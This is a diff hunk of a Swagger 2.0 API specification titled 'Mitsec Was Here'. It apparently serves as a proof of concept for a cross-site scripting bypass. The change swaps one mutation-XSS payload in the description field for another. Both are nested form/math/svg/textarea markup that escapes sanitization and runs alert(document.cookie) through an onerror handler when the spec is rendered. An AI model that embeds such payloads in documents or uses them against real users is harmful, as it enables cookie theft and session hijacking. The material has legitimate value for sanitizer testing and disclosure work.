@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Mitsec Was Here
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg onerror=alert(document.cookie)>"></form>
   version: production
 basePath: /JSSResource/
 produces:
